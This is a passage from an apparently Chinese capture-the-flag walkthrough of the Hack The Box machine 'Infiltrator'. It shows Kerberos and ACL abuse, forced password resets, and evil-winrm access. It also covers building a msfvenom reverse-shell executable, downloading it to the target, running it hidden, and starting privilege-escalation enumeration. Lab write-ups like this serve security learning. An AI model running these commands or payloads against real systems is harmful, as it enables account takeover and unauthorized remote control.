<h3 id="x45-x2e-x52-79-x44-x52-x49-71-x55-x45-90-x40-x49-x4e-70-73-76-x54-x52-65-x54-79-x52-x2e-x48-84-x42-x2d-45-45-97-100-x64-x73-101-x6c-f—-CHIEFS-x4d-x41-82-75-69-84-73-x4e-x47-64-73-78-x46-x49-x4c-84-x52-65-x54-79-x52-x2e-x48-84-66"><a href="#x45-x2e-x52-79-x44-x52-x49-71-x55-x45-90-x40-x49-x4e-70-73-76-x54-x52-65-x54-79-x52-x2e-x48-84-x42-x2d-45-45-97-100-x64-x73-101-x6c-f—-CHIEFS-x4d-x41-82-75-69-84-73-x4e-x47-64-73-78-x46-x49-x4c-84-x52-65-x54-79-x52-x2e-x48-84-66" class="headerlink" title="&#x45;&#x2e;&#x52;&#79;&#x44;&#x52;&#x49;&#71;&#x55;&#x45;&#90;&#x40;&#x49;&#x4e;&#70;&#73;&#76;&#x54;&#x52;&#65;&#x54;&#79;&#x52;&#x2e;&#x48;&#84;&#x42;&#x2d;&#45;&#45;&#97;&#100;&#x64;&#x73;&#101;&#x6c;f—&gt;CHIEFS &#x4d;&#x41;&#82;&#75;&#69;&#84;&#73;&#x4e;&#x47;&#64;&#73;&#78;&#x46;&#x49;&#x4c;&#84;&#x52;&#65;&#x54;&#79;&#x52;&#x2e;&#x48;&#84;&#66;"></a><a href="mailto:&#x45;&#x2e;&#x52;&#79;&#x44;&#x52;&#x49;&#71;&#x55;&#x45;&#90;&#x40;&#x49;&#x4e;&#70;&#73;&#76;&#x54;&#x52;&#65;&#x54;&#79;&#x52;&#x2e;&#x48;&#84;&#x42;&#x2d;&#45;&#45;&#97;&#100;&#x64;&#x73;&#101;&#x6c;">&#x45;&#x2e;&#x52;&#79;&#x44;&#x52;&#x49;&#71;&#x55;&#x45;&#90;&#x40;&#x49;&#x4e;&#70;&#73;&#76;&#x54;&#x52;&#65;&#x54;&#79;&#x52;&#x2e;&#x48;&#84;&#x42;&#x2d;&#45;&#45;&#97;&#100;&#x64;&#x73;&#101;&#x6c;</a>f—&gt;CHIEFS <a href="mailto:&#x4d;&#x41;&#82;&#75;&#69;&#84;&#73;&#x4e;&#x47;&#64;&#73;&#78;&#x46;&#x49;&#x4c;&#84;&#x52;&#65;&#x54;&#79;&#x52;&#x2e;&#x48;&#84;&#66;">&#x4d;&#x41;&#82;&#75;&#69;&#84;&#73;&#x4e;&#x47;&#64;&#73;&#78;&#x46;&#x49;&#x4c;&#84;&#x52;&#65;&#x54;&#79;&#x52;&#x2e;&#x48;&#84;&#66;</a></h3><p>意思是让我用e.rodriguez这个账号把自己加入到组“CHIEFS <a href="mailto:&#77;&#x41;&#82;&#x4b;&#x45;&#x54;&#x49;&#x4e;&#x47;&#64;&#73;&#78;&#70;&#x49;&#76;&#x54;&#82;&#x41;&#x54;&#79;&#82;&#46;&#x48;&#84;&#66;">&#77;&#x41;&#82;&#x4b;&#x45;&#x54;&#x49;&#x4e;&#x47;&#64;&#73;&#78;&#70;&#x49;&#76;&#x54;&#82;&#x41;&#x54;&#79;&#82;&#46;&#x48;&#84;&#66;</a>”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">getTGT.py infiltrator.htb/&quot;e.rodriguez&quot;:&quot;QWEasd123@123&quot; -dc-ip dc01.infiltrator.htb</span><br><span class="line"></span><br><span class="line">KRB5CCNAME=e.rodriguez.ccache</span><br><span class="line"></span><br><span class="line">python /opt/AD_tools/bloodyAD/bloodyAD.py --host &quot;dc01.infiltrator.htb&quot; -d &quot;infiltrator.htb&quot; --dc-ip 10.10.11.31 -u e.rodriguez -k add groupMember &quot;CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB&quot; e.rodriguez</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="CHIEFS-x4d-x41-82-x4b-x45-x54-73-78-71-64-x49-x4e-70-x49-x4c-84-x52-x41-x54-79-82-x2e-x48-x54-x42-x2d-x2d-45-x66-111-x72-x63-x65-99-104-x61-x6e-103-101-112-97-115-x73-x77-x6f-114-d—-77-46-x48-65-82-x52-x49-83-64-73-x4e-x46-x49-76-84-82-x41-84-x4f-x52-x2e-72-84-66"><a href="#CHIEFS-x4d-x41-82-x4b-x45-x54-73-78-71-64-x49-x4e-70-x49-x4c-84-x52-x41-x54-79-82-x2e-x48-x54-x42-x2d-x2d-45-x66-111-x72-x63-x65-99-104-x61-x6e-103-101-112-97-115-x73-x77-x6f-114-d—-77-46-x48-65-82-x52-x49-83-64-73-x4e-x46-x49-76-84-82-x41-84-x4f-x52-x2e-72-84-66" class="headerlink" title="CHIEFS &#x4d;&#x41;&#82;&#x4b;&#x45;&#x54;&#73;&#78;&#71;&#64;&#x49;&#x4e;&#70;&#x49;&#x4c;&#84;&#x52;&#x41;&#x54;&#79;&#82;&#x2e;&#x48;&#x54;&#x42;&#x2d;&#x2d;&#45;&#x66;&#111;&#x72;&#x63;&#x65;&#99;&#104;&#x61;&#x6e;&#103;&#101;&#112;&#97;&#115;&#x73;&#x77;&#x6f;&#114;d—&gt;  &#77;&#46;&#x48;&#65;&#82;&#x52;&#x49;&#83;&#64;&#73;&#x4e;&#x46;&#x49;&#76;&#84;&#82;&#x41;&#84;&#x4f;&#x52;&#x2e;&#72;&#84;&#66;"></a>CHIEFS <a href="mailto:&#x4d;&#x41;&#82;&#x4b;&#x45;&#x54;&#73;&#78;&#71;&#64;&#x49;&#x4e;&#70;&#x49;&#x4c;&#84;&#x52;&#x41;&#x54;&#79;&#82;&#x2e;&#x48;&#x54;&#x42;&#x2d;&#x2d;&#45;&#x66;&#111;&#x72;&#x63;&#x65;&#99;&#104;&#x61;&#x6e;&#103;&#101;&#112;&#97;&#115;&#x73;&#x77;&#x6f;&#114;">&#x4d;&#x41;&#82;&#x4b;&#x45;&#x54;&#73;&#78;&#71;&#64;&#x49;&#x4e;&#70;&#x49;&#x4c;&#84;&#x52;&#x41;&#x54;&#79;&#82;&#x2e;&#x48;&#x54;&#x42;&#x2d;&#x2d;&#45;&#x66;&#111;&#x72;&#x63;&#x65;&#99;&#104;&#x61;&#x6e;&#103;&#101;&#112;&#97;&#115;&#x73;&#x77;&#x6f;&#114;</a>d—&gt;  <a href="mailto:&#77;&#46;&#x48;&#65;&#82;&#x52;&#x49;&#83;&#64;&#73;&#x4e;&#x46;&#x49;&#76;&#84;&#82;&#x41;&#84;&#x4f;&#x52;&#x2e;&#72;&#84;&#66;">&#77;&#46;&#x48;&#65;&#82;&#x52;&#x49;&#83;&#64;&#73;&#x4e;&#x46;&#x49;&#76;&#84;&#82;&#x41;&#84;&#x4f;&#x52;&#x2e;&#72;&#84;&#66;</a></h3><p>由于e.rodriguez账号加入了CHIEFS <a href="mailto:&#77;&#x41;&#x52;&#x4b;&#x45;&#x54;&#73;&#x4e;&#x47;&#x40;&#73;&#78;&#70;&#x49;&#x4c;&#x54;&#x52;&#x41;&#x54;&#x4f;&#82;&#46;&#x48;&#84;&#66;">&#77;&#x41;&#x52;&#x4b;&#x45;&#x54;&#73;&#x4e;&#x47;&#x40;&#73;&#78;&#70;&#x49;&#x4c;&#x54;&#x52;&#x41;&#x54;&#x4f;&#82;&#46;&#x48;&#84;&#66;</a>组，就可以使用e.rodriguez账号强制修改 <a href="mailto:&#x4d;&#x2e;&#72;&#x41;&#82;&#82;&#x49;&#x53;&#x40;&#73;&#x4e;&#x46;&#x49;&#76;&#84;&#82;&#x41;&#x54;&#79;&#82;&#x2e;&#72;&#84;&#x42;">&#x4d;&#x2e;&#72;&#x41;&#82;&#82;&#x49;&#x53;&#x40;&#73;&#x4e;&#x46;&#x49;&#76;&#84;&#82;&#x41;&#x54;&#79;&#82;&#x2e;&#72;&#84;&#x42;</a>的密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">KRB5CCNAME=e.rodriguez.ccache</span><br><span class="line"></span><br><span class="line">python /opt/AD_tools/bloodyAD/bloodyAD.py --host &quot;dc01.infiltrator.htb&quot; -d &quot;infiltrator.htb&quot; --kerberos --dc-ip 10.10.11.31 -u &quot;e.rodriguez&quot; -p &quot;QWEasd123@123&quot; set password &quot;m.harris&quot; &quot;QWEasd123@123&quot;</span><br></pre></td></tr></table></figure>

<p>然后再进行<code>m.harris</code>凭据获取，再用<code>evil-winrm</code>使用这个凭据登录</p>
<p>难受，这个靶机是公用的，所以密码会互相覆盖，那么只能全部命令放在一起执行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">getTGT.py  infiltrator.htb/d.anderson:&#x27;WAT?watismypass!&#x27; -dc-ip dc01.infiltrator.htb</span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=d.anderson.ccache</span><br><span class="line"></span><br><span class="line">dacledit.py -action &#x27;write&#x27; -rights &#x27;FullControl&#x27; -inheritance -principal &#x27;d.anderson&#x27; -target-dn &#x27;OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB&#x27; &#x27;infiltrator.htb/d.anderson&#x27; -k -no-pass -dc-ip dc01.infiltrator.htb</span><br><span class="line"></span><br><span class="line">python /opt/AD_tools/bloodyAD/bloodyAD.py --host &quot;dc01.infiltrator.htb&quot; -d &quot;infiltrator.htb&quot; --kerberos --dc-ip 10.10.11.31 -u &quot;d.anderson&quot; -p &quot;WAT?watismypass\!&quot; set password &quot;e.rodriguez&quot; &quot;QWEasd123@123&quot;</span><br><span class="line"></span><br><span class="line">getTGT.py infiltrator.htb/e.rodriguez:&quot;QWEasd123@123&quot; -dc-ip dc01.infiltrator.htb</span><br><span class="line"></span><br><span class="line">KRB5CCNAME=e.rodriguez.ccache</span><br><span class="line">python /opt/AD_tools/bloodyAD/bloodyAD.py --host &quot;dc01.infiltrator.htb&quot; -d &quot;infiltrator.htb&quot; --dc-ip 10.10.11.31 -u e.rodriguez -k add groupMember &quot;CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB&quot; e.rodriguez</span><br><span class="line"></span><br><span class="line">python /opt/AD_tools/bloodyAD/bloodyAD.py --host &quot;dc01.infiltrator.htb&quot; -d &quot;infiltrator.htb&quot; --kerberos --dc-ip 10.10.11.31 -u &quot;e.rodriguez&quot; -p &quot;QWEasd123@123&quot; set password &quot;m.harris&quot; &quot;QWEasd123@123&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getTGT.py  infiltrator.htb/m.harris:&#x27;QWEasd123@123&#x27; -dc-ip dc01.infiltrator.htb</span><br><span class="line"></span><br><span class="line">KRB5CCNAME=m.harris.ccache evil-winrm -i dc01.infiltrator.htb -u m.harris -r infiltrator.htb</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里直接用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i dc01.infiltrator.htb -u m.harris  -p &quot;QWEasd123@123&quot;</span><br></pre></td></tr></table></figure>
<p>是登录不了的<br>所以乖乖的用Kerberos auth，也就是<code>KRB5CCNAME=m.harris.ccache</code> 加上<code>-r infiltrator.htb</code></p>
<h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><p>这密码大伙挤着改，给我整怕了，赶紧上msf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.2 LPORT=9001 -f exe -o reverse.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line">Saved as: reverse.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>本机用python起一个简单的http服务器 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>

<p>然后用evil-winrm直接给他下载到目标机器，并在后台运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.16.2/reverse.exe -o reverse.exe</span><br><span class="line">Start-Process -FilePath &quot;reverse.exe&quot; -WindowStyle Hidden</span><br></pre></td></tr></table></figure>

<p>看到shell连回来，我才敢慢慢操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q -x &quot;use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.16.2; set lport 9001; exploit -j&quot;</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">lhost =&gt; 10.10.16.2</span><br><span class="line">lport =&gt; 9001</span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.2:9001 </span><br><span class="line">[*] Sending stage (201798 bytes) to 10.10.11.31</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.16.2:9001 -&gt; 10.10.11.31:63625) at 2024-09-06 10:57:03 -0400</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里我用了 -j<br>持续监听收shell<br>所以我可以在<code>evil-winrm</code>多运行几次<code>Start-Process -FilePath &quot;reverse.exe&quot; -WindowStyle Hidden</code><br>这样多搞几个进程，在打靶机时候不至于因为一个进程崩了，导致全部重来</p>
<p>在实际攻防中，拿下一个shell也要用多种方法维持权限，高危操作要用单独的进程操作，这里由于只是打靶机，我只是多搞了几个进程。</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng">peass-ng&#x2F;PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors) (github.com)</a></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">start</span> /b winPEASx64.exe &gt;&gt; output.txt</span><br></pre></td></tr></table></figure>


<p>整理可能有用的东西</p>
<p>在进程列表里能看到OMServerService、outputmessenger_httpd、outputmessenger_mysqld比较显眼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">TCP        [::]                                        14118         [::]                                        0               Listening         7460            OMServerService</span><br><span class="line">TCP        [::]                                        14122         [::]                                        0               Listening         7460            OMServerService</span><br><span class="line">TCP        [::]                                        14123         [::]                                        0               Listening         4               System</span><br><span class="line">TCP        [::]                                        14125         [::]                                        0               Listening         4               System</span><br><span class="line">TCP        [::]                                        14126         [::]                                        0               Listening         3396            outputmessenger_httpd</span><br><span class="line">TCP        [::]                                        14127         [::]                                        0               Listening         7460            OMServerService</span><br><span class="line">TCP        [::]                                        14128         [::]                                        0               Listening         7460            OMServerService</span><br><span class="line">TCP        [::]                                        14130         [::]                                        0               Listening         7460            OMServerService</span><br><span class="line">TCP        [::]                                        14406         [::]                                        0               Listening         5548            outputmessenger_mysqld</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Output Messenger - MySQL(Output Messenger - MySQL)[&quot;C:\Program Files\Output Messenger Server\Plugins\Output\mysql\bin\outputmessenger_mysqld.exe&quot; &quot;--defaults-file=C:\Program Files\Output Messenger Server\Plugins\Output\mysql\my.ini&quot; &quot;OutputMessengerMySQL&quot;] - Autoload</span><br><span class="line">Output Messenger - MySQL</span><br></pre></td></tr></table></figure>

<p>可以直接看到这个起了mysql的进程好像有点东西</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\M.harris&gt;cd &quot;C:\Program Files\Output Messenger Server\&quot;</span><br><span class="line">cd &quot;C:\Program Files\Output Messenger Server\&quot;                                                                                     </span><br><span class="line">Access is denied. </span><br></pre></td></tr></table></figure>
<p>又没有权限</p>
<p>那就得找找他的文件了</p>
<p>能够自动，绝对不手动，msf冲冲冲</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; search -f &quot;*Output Messenger Server*&quot;</span><br><span class="line">Found 4 results...</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">Path                                                                                                                                     Size (bytes)  Modified (UTC)</span><br><span class="line">----                                                                                                                                     ------------  --------------</span><br><span class="line">c:\ProgramData\Microsoft\Windows\Start Menu\Programs\Output Messenger\Output Messenger Server\Output Messenger Server Manager.lnk        1188          2024-02-25 10:35:07 -0500</span><br><span class="line">c:\ProgramData\Microsoft\Windows\Start Menu\Programs\Output Messenger\Output Messenger Server\Uninstall Output Messenger Server.lnk      1136          2024-02-19 10:41:20 -0500</span><br><span class="line">c:\Users\All Users\Microsoft\Windows\Start Menu\Programs\Output Messenger\Output Messenger Server\Output Messenger Server Manager.lnk    1188          2024-02-25 10:35:07 -0500</span><br><span class="line">c:\Users\All Users\Microsoft\Windows\Start Menu\Programs\Output Messenger\Output Messenger Server\Uninstall Output Messenger Server.lnk  1136          2024-02-19 10:41:20 -0500</span><br></pre></td></tr></table></figure>
<p>这似乎有点少，而且找到的都是快捷方式</p>
<p>如果是文件名，在windows上一般不会有空格隔开</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Output Messenger  -&gt; OutputMessenger</span><br></pre></td></tr></table></figure>
<p>再找找</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; search -f &quot;*OutputMessenger*&quot;</span><br><span class="line">Found 6 results...</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">Path                                                                       Size (bytes)  Modified (UTC)</span><br><span class="line">----                                                                       ------------  --------------</span><br><span class="line">c:\Program Files\Output Messenger\OutputMessenger.exe                      6826240       2023-10-23 16:41:12 -0400</span><br><span class="line">c:\Program Files\Output Messenger\OutputMessenger.exe.config               1788          2022-12-19 14:07:18 -0500</span><br><span class="line">c:\ProgramData\Output Messenger Server\Temp\OutputMessengerApache.zip      15702539      2024-02-19 10:51:30 -0500</span><br><span class="line">c:\ProgramData\Output Messenger Server\Temp\OutputMessengerMysql.zip       25477937      2024-02-19 10:51:52 -0500</span><br><span class="line">c:\Users\All Users\Output Messenger Server\Temp\OutputMessengerApache.zip  15702539      2024-02-19 10:51:30 -0500</span><br><span class="line">c:\Users\All Users\Output Messenger Server\Temp\OutputMessengerMysql.zip   25477937      2024-02-19 10:51:52 -0500</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>hh不亏是我<br>这里看到了一个<code>OutputMessenger.exe.config</code>，这一看就是要出货的节奏<br>如果不出结果只能下载那几个zip下来分析了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat &quot;c:\Program Files\Output Messenger\OutputMessenger.exe.config&quot;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;configSections&gt;</span><br><span class="line">    &lt;section name=&quot;entityFramework&quot; type=&quot;System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot; requirePermission=&quot;false&quot;/&gt;</span><br><span class="line">  &lt;/configSections&gt;</span><br><span class="line">  &lt;runtime&gt;</span><br><span class="line">    &lt;legacyCorruptedStateExceptionsPolicy enabled=&quot;false&quot;/&gt;</span><br><span class="line">  &lt;/runtime&gt;</span><br><span class="line">  &lt;startup useLegacyV2RuntimeActivationPolicy=&quot;true&quot;&gt;</span><br><span class="line">    &lt;supportedRuntime version=&quot;v4.0&quot; sku=&quot;.NETFramework,Version=v4.0&quot;/&gt;</span><br><span class="line">  &lt;/startup&gt;</span><br><span class="line">  &lt;system.data&gt;</span><br><span class="line">    &lt;DbProviderFactories&gt;</span><br><span class="line">      &lt;clear/&gt;</span><br><span class="line">      &lt;remove invariant=&quot;System.Data.SQLite&quot;/&gt;</span><br><span class="line">      &lt;add name=&quot;SQLite Data Provider&quot; invariant=&quot;System.Data.SQLite&quot; description=&quot;Data Provider for SQLite&quot; type=&quot;System.Data.SQLite.SQLiteFactory, System.Data.SQLite&quot;/&gt;</span><br><span class="line">      &lt;remove invariant=&quot;System.Data.SQLite.EF6&quot;/&gt;</span><br><span class="line">      &lt;add name=&quot;SQLite Data Provider (Entity Framework 6)&quot; invariant=&quot;System.Data.SQLite.EF6&quot; description=&quot;.NET Framework Data Provider for SQLite (Entity Framework 6)&quot; type=&quot;System.Data.SQLite.EF6.SQLiteProviderFactory, System.Data.SQLite.EF6&quot;/&gt;</span><br><span class="line">    &lt;/DbProviderFactories&gt;</span><br><span class="line">  &lt;/system.data&gt;</span><br><span class="line">  &lt;entityFramework&gt;</span><br><span class="line">    &lt;defaultConnectionFactory type=&quot;System.Data.Entity.Infrastructure.SqlConnectionFactory, EntityFramework&quot;/&gt;</span><br><span class="line">    &lt;providers&gt;</span><br><span class="line">      &lt;provider invariantName=&quot;System.Data.SqlClient&quot; type=&quot;System.Data.Entity.SqlServer.SqlProviderServices, EntityFramework.SqlServer&quot;/&gt;</span><br><span class="line">      &lt;provider invariantName=&quot;System.Data.SQLite&quot; type=&quot;System.Data.SQLite.EF6.SQLiteProviderServices, System.Data.SQLite.EF6&quot;/&gt;</span><br><span class="line">      &lt;provider invariantName=&quot;System.Data.SQLite.EF6&quot; type=&quot;System.Data.SQLite.EF6.SQLiteProviderServices, System.Data.SQLite.EF6&quot; /&gt;</span><br><span class="line">    &lt;/providers&gt;</span><br><span class="line">  &lt;/entityFramework&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>啊？SQLite一般不联网使用的，而且明显有个<code>OutputMessengerMysql.zip</code>看来主要目标是它</p>
<p>看来还是得下载zip来看看了</p>
<p>边下载zip，还可以边看看这个<code>c:\Program Files\Output Messenger\</code>目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\M.harris&gt;dir &quot;c:\Program Files\Output Messenger\&quot;</span><br><span class="line">dir &quot;c:\Program Files\Output Messenger\&quot;</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 96C7-B603</span><br><span class="line"></span><br><span class="line"> Directory of c:\Program Files\Output Messenger</span><br><span class="line"></span><br><span class="line">02/23/2024  06:06 AM    &lt;DIR&gt;          .</span><br><span class="line">02/23/2024  06:06 AM    &lt;DIR&gt;          ..</span><br><span class="line">01/30/2021  02:03 PM               352 add_reinstall_prop.vbs</span><br><span class="line">04/07/2010  11:56 AM           106,496 antlr.runtime.dll</span><br><span class="line">01/30/2021  02:03 PM            15,186 Buzz.wav</span><br><span class="line">06/24/2022  02:13 PM            26,112 DDay.Collections.dll</span><br><span class="line">06/24/2022  02:13 PM           198,656 DDay.iCal.dll</span><br><span class="line">02/23/2024  06:06 AM    &lt;DIR&gt;          EmojiImg</span><br><span class="line">01/30/2021  02:03 PM         4,965,584 EntityFramework.dll</span><br><span class="line">01/30/2021  02:03 PM           595,152 EntityFramework.SqlServer.dll</span><br><span class="line">01/30/2021  02:03 PM           456,192 Hunspellx64.dll</span><br><span class="line">01/30/2021  02:03 PM           407,552 Hunspellx86.dll</span><br><span class="line">01/30/2021  02:03 PM           212,992 ICSharpCode.SharpZipLib.dll</span><br><span class="line">02/23/2024  06:06 AM    &lt;DIR&gt;          Languages</span><br><span class="line">08/26/2016  04:53 PM            24,064 LINQtoCSV.dll</span><br><span class="line">09/11/2020  01:59 PM             3,700 Login.wav</span><br><span class="line">09/11/2020  01:59 PM             3,534 Logout.wav</span><br><span class="line">02/23/2024  06:06 AM    &lt;DIR&gt;          MachineConfigFix</span><br><span class="line">09/11/2020  01:59 PM            16,450 Message.wav</span><br><span class="line">01/30/2021  02:03 PM           259,464 Microsoft.VisualBasic.PowerPacks.Vs.dll</span><br><span class="line">01/31/2020  06:02 PM           513,536 NAudio.dll</span><br><span class="line">06/22/2015  12:06 PM           510,976 Newtonsoft.Json.dll</span><br><span class="line">01/30/2021  02:03 PM            24,576 NHunspell.dll</span><br><span class="line">10/23/2023  01:40 PM         1,855,488 NHunspellExtender.dll</span><br><span class="line">06/11/2021  07:07 PM            24,912 OM.AutoUpdate.exe</span><br><span class="line">10/23/2023  01:40 PM            12,288 OM.ChatCommands.dll</span><br><span class="line">10/23/2023  01:40 PM            95,232 OM.Client.dll</span><br><span class="line">10/23/2023  01:40 PM           195,584 OM.Common.dll</span><br><span class="line">10/23/2023  01:40 PM            11,776 OM.DragDrop.dll</span><br><span class="line">10/23/2023  01:40 PM            68,096 OM.File.dll</span><br><span class="line">11/09/2016  05:47 PM             8,704 OM.FileReader.dll</span><br><span class="line">10/23/2023  01:40 PM           645,632 OM.OMDB.dll</span><br><span class="line">10/23/2023  01:40 PM           142,336 OM.Packet.dll</span><br><span class="line">10/23/2023  01:40 PM           195,072 OM.Plugin.dll</span><br><span class="line">10/23/2023  01:40 PM           218,624 OM.RD.dll</span><br><span class="line">10/23/2023  01:40 PM           297,472 OM.Snip.dll</span><br><span class="line">04/24/2021  12:11 PM            65,536 OM.Tab.dll</span><br><span class="line">10/23/2023  01:40 PM            19,968 OM.User.dll</span><br><span class="line">10/23/2023  01:41 PM         6,826,240 